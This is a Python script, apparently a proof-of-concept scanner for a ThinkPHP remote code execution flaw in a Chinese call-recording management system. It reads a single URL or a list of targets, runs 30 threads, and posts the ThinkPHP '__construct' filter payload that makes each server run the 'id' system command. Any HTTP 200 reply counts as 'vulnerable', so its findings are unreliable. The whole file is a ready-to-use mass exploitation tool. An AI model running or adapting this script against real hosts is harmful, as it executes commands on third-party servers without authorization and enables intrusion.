import requests,argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parse = argparse.ArgumentParser(description="申瓯通信在线录音管理系统Thinkphp远程代码执行漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                targets.append(target)
            pool.map(check, targets)
    except Exception as e:
        pass
def check(url):
    target = f"http://{url}/callcenter/public/index.php/index.php?s=index/index/index"
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    data="""
    s=id&_method=__construct&method=POST&filter[]=system
    """

    response = requests.post(url=target,data=data,headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200:
            print(f"[*] {url} 存在漏洞")
        else:
            print(f"[!] {url} 没有漏洞")
    except Exception as e:
        print(f"[Error] {url} TimeOut")


if __name__ == '__main__':
    main()
